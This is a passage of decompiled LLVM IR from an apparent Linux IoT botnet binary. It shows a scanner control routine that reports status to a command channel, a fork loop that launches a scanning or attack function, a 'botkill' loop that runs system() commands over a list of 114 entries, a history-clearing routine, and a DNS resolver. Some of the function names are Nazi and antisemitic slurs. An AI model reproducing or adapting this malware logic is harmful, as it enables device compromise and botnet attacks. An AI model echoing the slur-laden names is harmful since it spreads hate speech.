%dec_label_pc_8052a21 ], [ %stack_var_-624.284, %dec_label_pc_8052b54 ], [ %stack_var_-624.284, %dec_label_pc_8052b3b ], [ %stack_var_-624.284, %dec_label_pc_80529ce ]
  %v4_805372c = add nuw nsw i32 %storemerge85, 1
  store i32 %v4_805372c, i32* %eax.global-to-local, align 4
  %v5_8053735 = icmp slt i32 %v4_805372c, %stack_var_-56.0
  br i1 %v5_8053735, label %dec_label_pc_80528cc, label %dec_label_pc_80528c0

dec_label_pc_8053740:                             ; preds = %entry
  %v2_8053749 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053749, i32* @ebx, align 4
  store i32 %v0_8052728, i32* @esi, align 4
  store i32 %v0_8052727, i32* @edi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_805372c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %stack_var_-648.2, { 1, 0 }
  uselistorder i32 %stack_var_-644.3, { 1, 0 }
  uselistorder i32 %stack_var_-640.3, { 1, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %v4_8053566, { 1, 2, 0 }
  uselistorder i32 %stack_var_-644.1, { 0, 2, 1 }
  uselistorder i32 %stack_var_-640.1, { 0, 2, 1 }
  uselistorder i32 %v4_80534b6, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32 %stack_var_-640.263, { 1, 0 }
  uselistorder i32 %storemerge265, { 7, 8, 6, 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %v4_8053361, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 %v4_805331b, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %storemerge454, { 5, 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_80530e9, { 1, 0 }
  uselistorder i32 %v4_8053017, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_8052fb1, { 1, 0 }
  uselistorder i32 %v0_8052f10, { 1, 0 }
  uselistorder i32 %v4_8052e3e, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_8052dd8, { 1, 0 }
  uselistorder i32 %v5_8052bff, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_8052bab, { 1, 0 }
  uselistorder i32 %v2_8052b9c, { 1, 0 }
  uselistorder i32 %v2_8052a6f, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v1_8052a6c, { 1, 0 }
  uselistorder i32 %v1_80529a3, { 1, 0 }
  uselistorder i32 %v2_8052953, { 1, 0 }
  uselistorder i32 %v6_8052909, { 8, 9, 7, 5, 6, 4, 2, 3, 1, 0, 11, 10, 12 }
  uselistorder i32* %v1_80528da, { 6, 7, 5, 3, 4, 2, 1, 0, 8 }
  uselistorder i32 %v1_80528d7, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_80528d5, { 55, 54, 57, 56, 59, 58, 61, 60, 62, 53, 52, 51, 49, 48, 50, 38, 37, 40, 39, 41, 43, 42, 44, 45, 46, 47, 33, 32, 35, 34, 36, 27, 26, 28, 29, 30, 31, 22, 21, 24, 23, 25, 16, 15, 17, 18, 19, 20, 8, 7, 10, 9, 11, 13, 12, 14, 1, 3, 2, 4, 0, 5, 6, 63 }
  uselistorder i32 %v2_80528d2, { 47, 48, 45, 46, 49, 50, 43, 44, 42, 41, 40, 38, 39, 36, 37, 34, 35, 33, 32, 31, 30, 28, 29, 27, 26, 25, 24, 22, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 51, 8, 9, 7, 10, 5, 6, 4, 2, 3, 0, 1, 52 }
  uselistorder i32 %stack_var_-628.278, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 21, 19, 16, 12, 10, 8, 3, 2, 1, 0, 6, 7, 5, 4, 11, 9, 15, 18, 17, 20, 14, 22, 13 }
  uselistorder i32 %stack_var_-640.481, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-644.482, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-648.383, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 3, 1, 4, 6, 2, 0 }
  uselistorder i32 %stack_var_-624.284, { 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 31, 28, 26, 24, 23, 22, 18, 16, 14, 11, 10, 9, 8, 3, 2, 1, 0, 6, 7, 5, 4, 13, 12, 15, 17, 21, 20, 19, 27, 25, 30, 32, 29 }
  uselistorder i32 %storemerge85, { 1, 2, 3, 4, 6, 5, 0 }
  uselistorder i32 %v2_8053300, { 0, 11, 10, 7, 6, 5, 4, 3, 9, 8, 2, 1, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %v4_80528b5, { 2, 1, 0 }
  uselistorder i32 %storemerge5101, { 2, 1, 0 }
  uselistorder i32 %v2_805284e, { 1, 0 }
  uselistorder i32 %v2_8052831, { 30, 29, 0, 28, 1, 27, 33, 32, 2, 31, 3, 26, 25, 24, 42, 40, 39, 38, 41, 37, 36, 35, 34, 46, 53, 52, 4, 51, 5, 50, 6, 49, 48, 47, 45, 44, 43, 60, 59, 58, 57, 56, 55, 7, 54, 64, 66, 67, 65, 63, 62, 61, 75, 74, 73, 72, 71, 70, 69, 8, 68, 79, 80, 78, 77, 76, 85, 84, 89, 88, 87, 86, 83, 82, 81, 97, 98, 96, 95, 94, 93, 9, 92, 102, 10, 101, 100, 103, 11, 99, 12, 105, 104, 91, 13, 90, 14, 23, 15, 106, 16, 22, 17, 18, 21, 20, 19 }
  uselistorder i32 %stack_var_-56.0, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v15_805272a, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-684, { 4, 5, 6, 7, 3, 8, 1, 9, 10, 0, 2, 11, 12 }
  uselistorder i32* %stack_var_-608, { 2, 0, 3, 1, 5, 4 }
  uselistorder i32* %stack_var_-600, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %stack_var_-320, { 1, 0, 2 }
  uselistorder i32* %stack_var_-328, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-332, { 3, 2, 4, 1, 0, 5, 6 }
  uselistorder i32* %stack_var_-336, { 7, 1, 9, 8, 4, 5, 10, 3, 2, 6, 11, 0, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 8, 9, 6, 7, 5, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 28, 29, 26, 27, 25, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 67, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32* %eax.global-to-local, { 235, 2, 1, 3, 4, 5, 6, 7, 8, 11, 9, 10, 14, 13, 15, 16, 17, 18, 19, 12, 20, 21, 22, 23, 26, 24, 25, 48, 28, 27, 30, 29, 31, 32, 33, 34, 35, 36, 42, 43, 44, 45, 46, 37, 38, 39, 40, 41, 47, 253, 63, 50, 49, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 252, 65, 64, 68, 66, 70, 69, 73, 71, 72, 74, 75, 76, 77, 78, 79, 82, 80, 81, 83, 84, 87, 85, 86, 90, 88, 89, 93, 91, 92, 67, 94, 95, 96, 99, 97, 100, 98, 101, 102, 103, 105, 104, 108, 106, 107, 109, 110, 111, 112, 113, 114, 116, 115, 119, 117, 118, 124, 121, 125, 122, 123, 126, 127, 120, 128, 129, 130, 133, 131, 134, 132, 135, 136, 137, 139, 138, 142, 140, 141, 143, 144, 145, 146, 147, 148, 150, 149, 153, 151, 152, 158, 155, 159, 156, 157, 160, 161, 154, 162, 163, 164, 166, 165, 169, 167, 168, 171, 170, 174, 172, 173, 175, 176, 177, 178, 179, 180, 182, 181, 183, 184, 185, 187, 186, 188, 189, 190, 191, 192, 195, 193, 194, 197, 196, 198, 199, 202, 200, 201, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 223, 224, 225, 226, 227, 222, 228, 229, 230, 231, 232, 233, 234, 254, 238, 236, 237, 255, 239, 240, 242, 241, 0, 244, 243, 245, 247, 246, 248, 249, 251, 250 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__GI_snprintf, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @get_ipstate_host, { 2, 1, 0 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @send, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @reset_ipstate, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805372c, { 33, 1, 7, 8, 9, 2, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 20, 21, 22, 23, 4, 24, 25, 26, 5, 27, 28, 29, 30, 31, 6, 32, 0 }
  uselistorder label %dec_label_pc_8053566, { 1, 0 }
  uselistorder label %dec_label_pc_8053501, { 1, 0 }
  uselistorder label %dec_label_pc_80533e2, { 1, 0 }
  uselistorder label %dec_label_pc_80533c7, { 1, 0 }
  uselistorder label %dec_label_pc_80532f0, { 1, 0 }
  uselistorder label %dec_label_pc_8052a21, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052900, { 1, 0 }
  uselistorder label %dec_label_pc_80528cc, { 1, 0 }
  uselistorder label %dec_label_pc_80528c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052870, { 1, 0 }
  uselistorder label %dec_label_pc_80527a0, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805374e = load i32, i32* @ebp, align 4
  store i32 %v0_805374e, i32* %stack_var_-4, align 4
  %v4_805374e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805374e, i32* @ebp, align 4
  %v1_8053754 = call i32 @fork(i32 %v0_805374e)
  %v1_8053763 = call i32 @sysconf(i32 84)
  %v2_805376e = mul i32 %v1_8053763, 64
  %v4_805377b = icmp eq i32 %v1_8053754, 0
  br i1 %v4_805377b, label %dec_label_pc_80537b6.preheader, label %dec_label_pc_8053781

dec_label_pc_8053781:                             ; preds = %entry
  store i32 %v1_8053754, i32* @global_var_80756c0.301, align 64
  br label %dec_label_pc_80537be

dec_label_pc_80537b6.preheader:                   ; preds = %entry
  %v5_80537bc20 = icmp sgt i32 %v1_8053763, 0
  br i1 %v5_80537bc20, label %dec_label_pc_805379a, label %dec_label_pc_80537be

dec_label_pc_805379a:                             ; preds = %dec_label_pc_80537b6.preheader, %dec_label_pc_805379a
  %storemerge21 = phi i32 [ %v4_80537b3, %dec_label_pc_805379a ], [ 0, %dec_label_pc_80537b6.preheader ]
  %v3_80537ae = call i32 @BurnTheJews(i32 370, i32 %v2_805376e, i32 %arg1)
  %v4_80537b3 = add nuw nsw i32 %storemerge21, 1
  %exitcond = icmp eq i32 %v4_80537b3, %v1_8053763
  br i1 %exitcond, label %dec_label_pc_80537be, label %dec_label_pc_805379a

dec_label_pc_80537be:                             ; preds = %dec_label_pc_80537b6.preheader, %dec_label_pc_805379a, %dec_label_pc_8053781
  %v0_80537bf = phi i32 [ %v1_8053754, %dec_label_pc_8053781 ], [ 0, %dec_label_pc_80537b6.preheader ], [ %v1_8053763, %dec_label_pc_805379a ]
  %v2_80537be = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80537be, i32* @ebp, align 4
  ret i32 %v0_80537bf

; uselistorder directives
  uselistorder i32 %v4_80537b3, { 1, 0 }
  uselistorder i32 %v1_8053763, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8053754, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80537be, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805379a, { 1, 0 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp29 = icmp slt i32 %arg3, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_80537ed, label %dec_label_pc_80537ce

dec_label_pc_80537ce:                             ; preds = %entry
  %v3_80537e3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806b298.302 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80537ed:                             ; preds = %entry
  %v1_80537f0 = add i32 %arg4, 4
  %v5_80537f0 = icmp ugt i32 %arg4, -5
  store i1 %v5_80537f0, i1* %cf.global-to-local, align 1
  %v1_80537f3 = inttoptr i32 %v1_80537f0 to i32*
  %v2_80537f3 = load i32, i32* %v1_80537f3, align 4
  store i1 false, i1* @df, align 1
  %v4_8053807 = inttoptr i32 %v2_80537f3 to i8*
  store i32 %v2_80537f3, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806b2b5.303 to i32), i32* @edi, align 4
  %v7_8053810 = call i32 @_strncmp(i8* %v4_8053807, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806b2b5.303, i32 0, i32 0), i32 3)
  %v8_8053810 = urem i32 %v7_8053810, 2
  %v9_8053810 = icmp eq i32 %v8_8053810, 0
  %v0_8053812 = load i1, i1* %cf.global-to-local, align 1
  %v2_8053812 = or i1 %v0_8053812, %v9_8053810
  %v3_8053812 = zext i1 %v2_8053812 to i32
  %v4_8053812 = load i32, i32* @edx, align 4
  %v5_8053812 = and i32 %v4_8053812, -256
  %v6_8053812 = or i32 %v3_8053812, %v5_8053812
  %v7_8053812 = xor i32 %v6_8053812, 1
  store i32 %v7_8053812, i32* %edx.global-to-local, align 4
  %v3_8053818 = and i32 %v7_8053810, -256
  %v1_805381a = trunc i32 %v7_8053812 to i8
  %v3_805381a = zext i1 %v0_8053812 to i8
  %v4_805381a = sub nsw i8 %v1_805381a, %v3_805381a
  %v15_805381a = icmp eq i8 %v4_805381a, 0
  %v20_805381a = zext i8 %v4_805381a to i32
  %v23_805381a = or i32 %v20_805381a, %v3_8053818
  store i32 %v23_805381a, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_805381a, label %dec_label_pc_8053861, label %dec_label_pc_8053825

dec_label_pc_8053825:                             ; preds = %dec_label_pc_80537ed
  store i1 %v5_80537f0, i1* %cf.global-to-local, align 1
  %v2_805382b = load i32, i32* %v1_80537f3, align 4
  store i1 false, i1* @df, align 1
  %v4_805383f = inttoptr i32 %v2_805382b to i8*
  store i32 %v2_805382b, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806b2b8.304 to i32), i32* @edi, align 4
  %v7_8053848 = call i32 @_strncmp(i8* %v4_805383f, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806b2b8.304, i32 0, i32 0), i32 3)
  %v8_8053848 = urem i32 %v7_8053848, 2
  %v9_8053848 = icmp eq i32 %v8_8053848, 0
  %v0_805384a = load i1, i1* %cf.global-to-local, align 1
  %v2_805384a = or i1 %v0_805384a, %v9_8053848
  %v3_805384a = zext i1 %v2_805384a to i32
  %v4_805384a = load i32, i32* %edx.global-to-local, align 4
  %v5_805384a = and i32 %v4_805384a, -256
  %v6_805384a = or i32 %v3_805384a, %v5_805384a
  %v7_805384a = xor i32 %v6_805384a, 1
  store i32 %v7_805384a, i32* %edx.global-to-local, align 4
  %v3_8053850 = and i32 %v7_8053848, -256
  %v1_8053852 = trunc i32 %v7_805384a to i8
  %v3_8053852 = zext i1 %v0_805384a to i8
  %v4_8053852 = sub nsw i8 %v1_8053852, %v3_8053852
  %v15_8053852 = icmp eq i8 %v4_8053852, 0
  %v20_8053852 = zext i8 %v4_8053852 to i32
  %v23_8053852 = or i32 %v20_8053852, %v3_8053850
  store i32 %v23_8053852, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805385b = icmp eq i1 %v15_8053852, false
  br i1 %v1_805385b, label %dec_label_pc_80538e1, label %dec_label_pc_8053861

dec_label_pc_8053861:                             ; preds = %dec_label_pc_8053825, %dec_label_pc_80537ed
  %v0_8053861 = load i32, i32* @global_var_80756c0.301, align 64
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053866 = icmp eq i32 %v0_8053861, 0
  %v1_8053868 = icmp eq i1 %v1_8053866, false
  br i1 %v1_8053868, label %dec_label_pc_80538c0, label %dec_label_pc_805386a

dec_label_pc_805386a:                             ; preds = %dec_label_pc_8053861
  %v1_8053870 = call i32 @SeigHeil(i32 %arg1)
  %v0_8053875 = load i32, i32* @global_var_80756c0.301, align 64
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805387a = icmp eq i32 %v0_8053875, 0
  br i1 %v1_805387a, label %dec_label_pc_805389f, label %dec_label_pc_805387e

dec_label_pc_805387e:                             ; preds = %dec_label_pc_805386a
  %v3_8053895 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_806b2bc.305 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_805389f:                             ; preds = %dec_label_pc_805386a
  %v3_80538b6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806b2e8.306 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80538c0:                             ; preds = %dec_label_pc_8053861
  %v3_80538d7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_806b31c.307 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80538e1:                             ; preds = %dec_label_pc_8053825
  store i1 %v5_80537f0, i1* %cf.global-to-local, align 1
  %v2_80538e7 = load i32, i32* %v1_80537f3, align 4
  store i1 false, i1* @df, align 1
  %v4_80538fb = inttoptr i32 %v2_80538e7 to i8*
  store i32 %v2_80538e7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806b34f.308 to i32), i32* @edi, align 4
  %v7_8053904 = call i32 @_strncmp(i8* %v4_80538fb, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806b34f.308, i32 0, i32 0), i32 4)
  %v8_8053904 = urem i32 %v7_8053904, 2
  %v9_8053904 = icmp eq i32 %v8_8053904, 0
  %v0_8053906 = load i1, i1* %cf.global-to-local, align 1
  %v2_8053906 = or i1 %v0_8053906, %v9_8053904
  %v3_8053906 = zext i1 %v2_8053906 to i32
  %v4_8053906 = load i32, i32* %edx.global-to-local, align 4
  %v5_8053906 = and i32 %v4_8053906, -256
  %v6_8053906 = or i32 %v3_8053906, %v5_8053906
  %v7_8053906 = xor i32 %v6_8053906, 1
  store i32 %v7_8053906, i32* %edx.global-to-local, align 4
  %v1_805390e = trunc i32 %v7_8053906 to i8
  %v3_805390e = zext i1 %v0_8053906 to i8
  %v15_805390e = icmp eq i8 %v1_805390e, %v3_805390e
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_805390e, label %dec_label_pc_8053955, label %dec_label_pc_8053919

dec_label_pc_8053919:                             ; preds = %dec_label_pc_80538e1
  store i1 %v5_80537f0, i1* %cf.global-to-local, align 1
  %v2_805391f = load i32, i32* %v1_80537f3, align 4
  store i1 false, i1* @df, align 1
  %v4_8053933 = inttoptr i32 %v2_805391f to i8*
  store i32 %v2_805391f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806b353.309 to i32), i32* @edi, align 4
  %v7_805393c = call i32 @_strncmp(i8* %v4_8053933, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806b353.309, i32 0, i32 0), i32 4)
  %v8_805393c = urem i32 %v7_805393c, 2
  %v9_805393c = icmp eq i32 %v8_805393c, 0
  %v0_805393e = load i1, i1* %cf.global-to-local, align 1
  %v2_805393e = or i1 %v0_805393e, %v9_805393c
  %v3_805393e = zext i1 %v2_805393e to i32
  %v4_805393e = load i32, i32* %edx.global-to-local, align 4
  %v5_805393e = and i32 %v4_805393e, -256
  %v6_805393e = or i32 %v3_805393e, %v5_805393e
  %v7_805393e = xor i32 %v6_805393e, 1
  store i32 %v7_805393e, i32* %edx.global-to-local, align 4
  %v1_8053946 = trunc i32 %v7_805393e to i8
  %v3_8053946 = zext i1 %v0_805393e to i8
  %v15_8053946 = icmp eq i8 %v1_8053946, %v3_8053946
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805394f = icmp eq i1 %v15_8053946, false
  br i1 %v1_805394f, label %dec_label_pc_80539db, label %dec_label_pc_8053955

dec_label_pc_8053955:                             ; preds = %dec_label_pc_8053919, %dec_label_pc_80538e1
  %v0_8053955 = load i32, i32* @global_var_80756c0.301, align 64
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805395a = icmp eq i32 %v0_8053955, 0
  br i1 %v1_805395a, label %dec_label_pc_80539bd, label %dec_label_pc_805395e

dec_label_pc_805395e:                             ; preds = %dec_label_pc_8053955
  %v3_805396e = call i32 @kill(i32 %v0_8053955, i32 9)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053973 = icmp eq i32 %v3_805396e, 0
  %v1_8053975 = icmp eq i1 %v1_8053973, false
  br i1 %v1_8053975, label %dec_label_pc_805399f, label %dec_label_pc_8053977

dec_label_pc_8053977:                             ; preds = %dec_label_pc_805395e
  %v3_805398e = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_806b358.310 to i32))
  store i32 0, i32* @global_var_80756c0.301, align 64
  br label %dec_label_pc_80539f5

dec_label_pc_805399f:                             ; preds = %dec_label_pc_805395e
  %v3_80539b6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b384.311 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80539bd:                             ; preds = %dec_label_pc_8053955
  %v3_80539d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_806b3b8.312 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80539db:                             ; preds = %dec_label_pc_8053919
  %v3_80539f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806b298.302 to i32))
  br label %dec_label_pc_80539f5

dec_label_pc_80539f5:                             ; preds = %dec_label_pc_805399f, %dec_label_pc_8053977, %dec_label_pc_80538c0, %dec_label_pc_805389f, %dec_label_pc_805387e, %dec_label_pc_80537ce, %dec_label_pc_80539bd, %dec_label_pc_80539db
  %v0_80539fb = phi i32 [ %v3_80539b6, %dec_label_pc_805399f ], [ %v3_805398e, %dec_label_pc_8053977 ], [ %v3_80538d7, %dec_label_pc_80538c0 ], [ %v3_80538b6, %dec_label_pc_805389f ], [ %v3_8053895, %dec_label_pc_805387e ], [ %v3_80537e3, %dec_label_pc_80537ce ], [ %v3_80539d4, %dec_label_pc_80539bd ], [ %v3_80539f0, %dec_label_pc_80539db ]
  %v0_80539f5 = load i32, i32* @esp, align 4
  %v2_80539f5 = icmp ugt i32 %v0_80539f5, -65
  store i1 %v2_80539f5, i1* %cf.global-to-local, align 1
  ret i32 %v0_80539fb

; uselistorder directives
  uselistorder i1 %v0_805393e, { 1, 0 }
  uselistorder i1 %v0_8053906, { 1, 0 }
  uselistorder i1 %v0_805384a, { 1, 0 }
  uselistorder i32 %v7_8053848, { 1, 0 }
  uselistorder i1 %v0_8053812, { 1, 0 }
  uselistorder i32 %v7_8053810, { 1, 0 }
  uselistorder i1* %cf.global-to-local, { 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 %arg1, { 8, 7, 5, 6, 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_80539f5, { 7, 6, 0, 1, 2, 3, 4, 5 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  %stack_var_-528 = alloca i32, align 4
  %v0_8053a00 = load i32, i32* @ebx, align 4
  %v1_8053a07 = call i32 @fork(i32 %v0_8053a00)
  %v1_8053a0c = icmp eq i32 %v1_8053a07, 0
  br i1 %v1_8053a0c, label %dec_label_pc_8053aa7, label %dec_label_pc_8053a14.preheader

dec_label_pc_8053a14.preheader:                   ; preds = %entry
  %v2_8053a6b = ptrtoint i32* %stack_var_-528 to i32
  br label %dec_label_pc_8053a14

dec_label_pc_8053a14:                             ; preds = %dec_label_pc_8053a1d, %dec_label_pc_8053a14.preheader
  br label %dec_label_pc_8053a1d

dec_label_pc_8053a1d:                             ; preds = %dec_label_pc_8053a14, %dec_label_pc_8053a1d
  %storemerge14 = phi i32 [ 0, %dec_label_pc_8053a14 ], [ %v4_8053a93, %dec_label_pc_8053a1d ]
  %v1_8053a20 = mul i32 %storemerge14, 4
  %v2_8053a20 = add i32 %v1_8053a20, ptrtoint ([114 x i8*]* @global_var_80706a0.426 to i32)
  %v3_8053a20 = inttoptr i32 %v2_8053a20 to i32*
  %v4_8053a34 = load i32, i32* %v3_8053a20, align 4
  store i32 %v4_8053a34, i32* @ebx, align 4
  %v4_8053a3e = load i32, i32* %v3_8053a20, align 4
  store i32 %v4_8053a3e, i32* @esi, align 4
  %v3_8053a74 = call i32 @sprintf(i32 %v2_8053a6b, i32 ptrtoint ([123 x i8]* @global_var_806b3e8.427 to i32))
  %v1_8053a82 = call i32 @system(i32 %v2_8053a6b)
  %v1_8053a8e = call i32 @sleep(i32 1)
  %v4_8053a93 = add i32 %storemerge14, 1
  %tmp = icmp ult i32 %v4_8053a93, 114
  br i1 %tmp, label %dec_label_pc_8053a1d, label %dec_label_pc_8053a14

dec_label_pc_8053aa7:                             ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder label %dec_label_pc_8053a1d, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053ab1 = load i32, i32* @ebp, align 4
  store i32 %v0_8053ab1, i32* %stack_var_-4, align 4
  %v4_8053ab1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8053ab1, i32* @ebp, align 4
  %v2_8053abe = call i32 @system(i32 ptrtoint ([22 x i8]* @global_var_806b463.428 to i32))
  %v2_8053aca = call i32 @system(i32 ptrtoint ([29 x i8]* @global_var_806b479.429 to i32))
  %v2_8053ad6 = call i32 @system(i32 ptrtoint ([21 x i8]* @global_var_806b496.430 to i32))
  %v2_8053adb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053adb, i32* @ebp, align 4
  ret i32 %v2_8053ad6

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053add = load i32, i32* @ebp, align 4
  store i32 %v0_8053add, i32* %stack_var_-4, align 4
  %v4_8053add = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8053add, i32* @ebp, align 4
  %v1_8053ae9 = call i32 @mfork(i32 %arg2)
  %v1_8053aee = icmp eq i32 %v1_8053ae9, 0
  %v1_8053af0 = icmp eq i1 %v1_8053aee, false
  br i1 %v1_8053af0, label %dec_label_pc_8053b87, label %dec_label_pc_8053af6

dec_label_pc_8053af6:                             ; preds = %entry
  %v12_8053af6 = icmp eq i32 %arg3, 1
  %v1_8053afa = icmp eq i1 %v12_8053af6, false
  br i1 %v1_8053afa, label %dec_label_pc_8053b61, label %dec_label_pc_8053afc

dec_label_pc_8053afc:                             ; preds = %dec_label_pc_8053af6
  %v1_8053aff = add i32 %arg4, 4
  %v1_8053b02 = inttoptr i32 %v1_8053aff to i32*
  %v2_8053b02 = load i32, i32* %v1_8053b02, align 4
  %v1_8053b07 = call i32 @__GI_gethostbyname(i32 %v2_8053b02)
  %v1_8053b0c = add i32 %v1_8053b07, 16
  %v2_8053b0c = inttoptr i32 %v1_8053b0c to i32*
  %v3_8053b0c = load i32, i32* %v2_8053b0c, align 4
  %v1_8053b0f = inttoptr i32 %v3_8053b0c to i32*
  %v2_8053b0f = load i32, i32* %v1_8053b0f, align 4
  %v1_8053b11 = inttoptr i32 %v2_8053b0f to i32*
  %v2_8053b11 = load i32, i32* %v1_8053b11, align 4
  %v1_8053b16 = call i32 @__GI_inet_ntoa(i32 %v2_8053b11)
